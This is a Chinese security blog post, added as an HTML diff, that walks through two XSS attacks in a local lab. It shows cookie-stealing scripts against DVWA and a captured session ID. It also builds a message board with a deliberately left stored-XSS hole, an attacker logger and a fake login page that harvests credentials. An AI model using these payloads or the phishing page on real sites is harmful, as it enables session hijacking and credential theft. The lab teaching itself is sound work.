@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ycycyc - XSS漏洞的两个具体的利用方式</title>
+    <link rel="stylesheet" href="/css/styles.css">
+    <link rel="stylesheet" href="/css/tailwind.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/toc.css">
+    
+<header class="bg-black text-hacker-white py-4 font-dos font-extrabold">
+    <div class="container mx-auto flex items-center justify-between space-x-8">
+    
+      <h1 class="text-2xl font-bold ml-[100px] md:ml-0 animate-pulse text-hacker-color1 md:mr-[20%]">
+        <a href="/" class="hover:text-white transition-colors select-none">
+          ycycyc
+        </a>
+      </h1>
+  
+    <!-- 大屏幕 -->
+      <nav class="hidden md:block">
+        <ul class="flex space-x-6">
+          
+            <li>
+              <a href="/" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
+                Home
+              </a>
+            </li>
+          
+            <li>
+              <a href="/archives" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
+                Archives
+              </a>
+            </li>
+          
+            <li>
+              <a href="/categories" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
+                Categories
+              </a>
+            </li>
+          
+            <li>
+              <a href="/tags" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
+                Tags
+              </a>
+            </li>
+          
+            <li>
+              <a href="/about" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
+                About
+              </a>
+            </li>
+          
+        </ul>
+      </nav>
+  
+      <!-- 小屏幕 -->
+      <button id="menu-toggle" class="block md:hidden text-white focus:outline-none">
+        <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
+        </svg>
+      </button>
+    </div>
+  
+    <!-- 折叠菜单 -->
+    <nav id="mobile-menu" class="hidden bg-black">
+      <ul class="space-y-2 py-4 px-6">
+        
+          <li>
+            <a href="/" class="block text-white hover:text-hacker-color1 transition-colors">
+              Home
+            </a>
+          </li>
+        
+          <li>
+            <a href="/archives" class="block text-white hover:text-hacker-color1 transition-colors">
+              Archives
+            </a>
+          </li>
+        
+          <li>
+            <a href="/categories" class="block text-white hover:text-hacker-color1 transition-colors">
+              Categories
+            </a>
+          </li>
+        
+          <li>
+            <a href="/tags" class="block text-white hover:text-hacker-color1 transition-colors">
+              Tags
+            </a>
+          </li>
+        
+          <li>
+            <a href="/about" class="block text-white hover:text-hacker-color1 transition-colors">
+              About
+            </a>
+          </li>
+        
+      </ul>
+    </nav>
+   <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-F9W89HDHWL"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-F9W89HDHWL');
+</script>
+  
+    <!-- RSS Link -->
+    <link rel="alternate" type="application/rss+xml" title=" RSS" href="/rss.xml" />
+  </header>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lunr.js/2.3.9/lunr.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="/js/search.js"></script>
+  <script>
+        document.addEventListener("DOMContentLoaded", () => {
+    const menuToggle = document.getElementById("menu-toggle");
+    const mobileMenu = document.getElementById("mobile-menu");
+
+    menuToggle.addEventListener("click", () => {
+        if (mobileMenu.classList.contains("hidden")) {
+        mobileMenu.classList.remove("hidden");
+        } else {
+        mobileMenu.classList.add("hidden");
+        }
+    });
+    });
+
+  </script>
+  
+
+    <style>
+        p {
+            margin-top: 0 !important;
+            margin-bottom: 1rem !important;
+            font-size: 1.1rem;
+        }
+        figure {
+            margin: 0 !important;
+        }
+        pre {
+            padding: 0 !important;
+            margin-top: 0 !important;
+            margin-bottom: 1rem !important;
+        }
+        td {
+            padding: 0 !important;
+            margin-bottom: 1rem !important;
+        }
+        h1, h2, h3, h4, h5, h6 {
+            margin-top: 0 !important;
+            margin-bottom: 1rem !important;
+        }
+        @media (min-width: 1024px) {
+            #middle-box {
+                min-width: 56rem;
+            }
+        }
+    </style>
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body class="bg-black text-hacker-color3 container mx-auto" style="overflow-x:hidden">
+    <!-- 文章标题 -->
+    <h1 class="text-5xl text-hacker-color1 font-bold font-dos my-6 text-center">XSS漏洞的两个具体的利用方式</h1>
+
+    <!-- 发布时间 -->
+    <p class="text-hacker-color3 text-center text-sm mb-4">
+        2025-05-28
+    </p>
+
+    <!-- 文章内容 -->
+    <div id="article-content" class="article-entry prose prose-invert mx-auto max-w-4xl leading-relaxed highlight" style="display: flex;">
+        <div id="middle-box">
+            <h3 id="1-窃取网页浏览中的cookie值"><a href="#1-窃取网页浏览中的cookie值" class="headerlink" title="1.窃取网页浏览中的cookie值"></a>1.<strong>窃取网页浏览中的cookie值</strong></h3><p>用户登陆完成之后，网页一般会返回一个cookie值，相当于一个令牌可以直接进行登陆。</p>
+<p>如果想要通过script脚本获得当前页面的cookie值，通常会用到cookie。</p>
+<p><strong>具体攻击：</strong></p>
+<h5 id="靶场实践"><a href="#靶场实践" class="headerlink" title="靶场实践"></a>靶场实践</h5><p>DVWA     等级low</p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505181529336.png" alt="image-20250518152910272"></p>
+<p>尝试输入最简单的弹窗payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505181530775.png" alt="image-20250518153016694"></p>
+<p>弹窗成功</p>
+<p>查看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>简单的get传参,参数为name，无任何过滤</p>
+<p>本地利用xss获得cookie值</p>
+<p>hacker.js</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var img = new Image();</span><br><span class="line">img.src=&quot;http://127.0.0.1/DVWA/vulnerabilities/xss_r/hacker.php?x=&quot; + document.cookie;</span><br><span class="line">document.body.append(img);</span><br></pre></td></tr></table></figure>
+
+<p>hacker.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cookie = $_GET[&#x27;x&#x27;];</span><br><span class="line">$ip = getenv (&#x27;REMOTE_ADDR&#x27;);</span><br><span class="line">$time = date(&#x27;Y-m-d g:i:s&#x27;);</span><br><span class="line">$fp = fopen(&quot;cookie.txt&quot;,&quot;a&quot;);</span><br><span class="line">fwrite($fp,&quot;IP: &quot;.$ip.&quot;Date: &quot;.$time.&quot; Cookie:&quot;.$cookie.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>构造一个payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/DVWA-master/vulnerabilities/xss_r/?name=&lt;script src=&quot;http://localhost/DVWA-master/vulnerabilities/xss_r/hacker.js&quot; /&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发送给其他用户进行访问，并输入自己的名字（安全等级为low）</p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505181637357.png" alt="image-20250518163738310"></p>
+<p>先登录另一个用户</p>
+<p>smithy&#x2F;password</p>
+<p>设置安全等级为low</p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505181642345.png" alt="image-20250518164259315"></p>
+<p>xss_r目录下面多了一个cookie.txt文件</p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505181643989.png" alt="image-20250518164352955"></p>
+<p>成功得到了另一个用户的cookie值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IP: ::1Date: 2025-05-18 4:40:28 Cookie:PHPSESSID=qju48o1h63s6n78olt15h1o8sb; security=low</span><br><span class="line">IP: ::1Date: 2025-05-18 4:41:22 Cookie:PHPSESSID=qju48o1h63s6n78olt15h1o8sb; security=low</span><br></pre></td></tr></table></figure>
+
+<p>拿到了其他用户的cookie值那么怎么登陆到其他用户呢？</p>
+<p>首先进入到靶场的登陆页面</p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505181646644.png" alt="image-20250518164619598"></p>
+<p>更改cookie值刷新就可以进入cookie值对应的用户。</p>
+<h3 id="2-劫持流量实现恶意跳转"><a href="#2-劫持流量实现恶意跳转" class="headerlink" title="2.劫持流量实现恶意跳转"></a>2.劫持流量实现恶意跳转</h3><p>网页中想办法插入一句像这样的语句： <code>&lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;;&lt;/script&gt;</code>那么所访问的网站就会被跳转到百度的首页</p>
+<p>本地实践</p>
+<h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505272128996.png" alt="image-20250527212821916"></p>
+<p>根目录下面创建如下的文件</p>
+<p>config.php进行数据库配置或者直接创建数据库，并创建表</p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505272130919.png" alt="image-20250527213027883"></p>
+<p>index.php是有漏洞的留言板</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理留言提交</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span> &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO messages (content) VALUES (&#x27;<span class="subst">$message</span>&#x27;)&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;留言提交失败: &quot;</span> . <span class="variable">$conn</span>-&gt;error);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 防止重复提交</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取留言</span></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT content FROM messages ORDER BY id DESC&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;留言板&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123; font-family: Arial, sans-serif; max-width: <span class="number">800</span>px; margin: <span class="number">0</span> auto; padding: <span class="number">20</span>px; &#125;</span><br><span class="line">        .message &#123; margin: <span class="number">15</span>px <span class="number">0</span>; padding: <span class="number">10</span>px; border: <span class="number">1</span>px solid <span class="comment">#ddd; border-radius: 5px; &#125;</span></span><br><span class="line">        textarea &#123; width: <span class="number">100</span>%; padding: <span class="number">10</span>px; margin-bottom: <span class="number">10</span>px; &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;留言板系统&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">        &lt;textarea name=<span class="string">&quot;message&quot;</span> rows=<span class="string">&quot;5&quot;</span> required placeholder=<span class="string">&quot;请输入留言内容...&quot;</span>&gt;&lt;/textarea&gt;&lt;br&gt;</span><br><span class="line">        &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;提交留言&lt;/button&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;hr&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h2&gt;留言列表&lt;/h2&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>): <span class="meta">?&gt;</span></span><br><span class="line">        <span class="meta">&lt;?php</span> <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()): <span class="meta">?&gt;</span></span><br><span class="line">            &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">message</span>&quot;&gt;&lt;?= $<span class="title">row</span>[&#x27;<span class="title">content</span>&#x27;] ?&gt;&lt;/<span class="title">div</span>&gt;  &lt;!-- 故意保留<span class="title">XSS</span>漏洞 --&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">endwhile</span>; ?&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> <span class="title">else</span>: ?&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">p</span>&gt;暂无留言&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击者收集信息的页面(attacker.php)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 记录访问信息</span></span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>).<span class="string">&quot; | IP: &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$log</span> .= <span class="string">&quot;User-Agent: &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$log</span> .= <span class="string">&quot;Referer: &quot;</span>.(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]) ? <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>] : <span class="string">&#x27;无&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$log</span> .= <span class="string">&quot;Cookies: &quot;</span>.<span class="title function_ invoke__">print_r</span>(<span class="variable">$_COOKIE</span>, <span class="literal">true</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$log</span> .= <span class="string">&quot;GET参数: &quot;</span>.<span class="title function_ invoke__">print_r</span>(<span class="variable">$_GET</span>, <span class="literal">true</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$log</span> .= <span class="string">&quot;POST参数: &quot;</span>.<span class="title function_ invoke__">print_r</span>(<span class="variable">$_POST</span>, <span class="literal">true</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$log</span> .= <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;-&quot;</span>, <span class="number">50</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;attack_log.txt&#x27;</span>, <span class="variable">$log</span>, FILE_APPEND);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重定向到钓鱼页面</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: phishing/index.html&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>钓鱼网站的页面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;系统安全验证&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123; font-family: Arial, sans-serif; max-width: 500px; margin: 50px auto; padding: 20px; &#125;</span><br><span class="line">        .login-box &#123; border: 1px solid #ddd; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); &#125;</span><br><span class="line">        input &#123; width: 100%; padding: 12px; margin: 8px 0; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px; &#125;</span><br><span class="line">        button &#123; background-color: #4CAF50; color: white; padding: 12px 20px; border: none; border-radius: 4px; cursor: pointer; width: 100%; &#125;</span><br><span class="line">        .warning &#123; color: red; font-weight: bold; margin-bottom: 20px; &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;login-box&quot;&gt;</span><br><span class="line">        &lt;h2&gt;系统安全验证&lt;/h2&gt;</span><br><span class="line">        &lt;p class=&quot;warning&quot;&gt;⚠️ 您的账户存在异常访问，请重新登录验证身份&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">        &lt;form action=&quot;../attacker.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">            &lt;label for=&quot;username&quot;&gt;用户名:&lt;/label&gt;</span><br><span class="line">            &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;</span><br><span class="line"></span><br><span class="line">            &lt;label for=&quot;password&quot;&gt;密码:&lt;/label&gt;</span><br><span class="line">            &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;</span><br><span class="line"></span><br><span class="line">            &lt;button type=&quot;submit&quot;&gt;立即验证&lt;/button&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">        &lt;p style=&quot;margin-top: 20px; font-size: 12px; color: #777;&quot;&gt;</span><br><span class="line">            如果您遇到任何问题，请联系系统管理员。</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="漏洞实践"><a href="#漏洞实践" class="headerlink" title="漏洞实践"></a>漏洞实践</h5><p>访问留言板</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/xss-demo/index.php</span><br></pre></td></tr></table></figure>
+
+<p>输入下面的代码当作留言，提交留言</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">window.location.href = &#x27;attacker.php?from=xss&amp;cookie=&#x27; + encodeURIComponent(document.cookie);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>再重新访问留言板</p>
+<p>页面跳转到下面的页面即钓鱼网站的页面，即假装网页的登陆失效要求用户重新登陆</p>
+<p>用户只要输入并且进验证的话就会将账号和密码等信息收集储存起来</p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505280015092.png" alt="image-20250528001500039"></p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505280015162.png" alt="image-20250528001529126"></p>
+<h5 id="恶意脚本解释"><a href="#恶意脚本解释" class="headerlink" title="恶意脚本解释"></a><strong>恶意脚本解释</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">window.location.href = &#x27;attacker.php?from=xss&amp;cookie=&#x27; + encodeURIComponent(document.cookie);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>首先是<code>window.location.href</code> 操作</strong></p>
+<p>作用是修改当前的窗口的url，跳转到新的页面(使用户在不知道的情况下面被群迫进行了网页的重定向)</p>
+<p><strong>attacker.php</strong></p>
+<p>由攻击者指定的恶意脚本，同域名下面的恶意文件，本地测试可以直接写，实战的话就得利用已有的文件上传漏洞。</p>
+<p><strong>参数from &#x3D;xss</strong></p>
+<p>只是简单地标识攻击的方式</p>
+<p><strong>cookie&#x3D;<code>+</code>encodeURIComponent(document.cookie)</strong></p>
+<p><strong><code>document.cookie</code></strong></p>
+<p>获取当前网站的所有cookie</p>
+<p><strong><code>encodeURIComponent()</code></strong></p>
+<p>对特殊字符进行URL编码，确保数据完整传输</p>
+<h5 id="攻击过程图示"><a href="#攻击过程图示" class="headerlink" title="攻击过程图示"></a>攻击过程图示</h5><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505280040882.png" alt="image-20250528004000823"></p>
+
+        </div>
+        
+            <div class="post-container">
+                <aside class="toc-container">
+                    <button class="toc-toggle">文章目录</button>
+                    <nav class="toc" id="toc"></nav>
+                </aside>
+            </div>
+        
+    </div>
+    
+    <!-- 评论系统 -->
+    
+
+    <!-- 返回主页链接 -->
+    <div class="text-center my-8">
+        <a href="/" class="text-hacker-color1 underline hover:text-hacker-color2">← Back to Home</a>
+    </div>
+
+    <script src="/js/toc.js"></script>  <!-- 引入 TOC 逻辑 -->
+    <footer class="bg-black text-gray-400 py-4">
+    <div class="container mx-auto text-center">
+      <p>© <span id="current-year"></span>  ycycyc 
+        <br> Powered by <a class="hover:text-white duration-150 hover:underline decoration-slice" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a class="hover:text-white duration-150 hover:underline decoration-slice" target="_blank" rel="noopener" href="https://github.com/m310ct/hexo-theme-hexploit">Hexpolit</a></p>
+    </div>
+  </footer>
+  
+  <script> 
+    document.getElementById("current-year").textContent = new Date().getFullYear();
+  </script>
+  
+
+</body>
+</html>
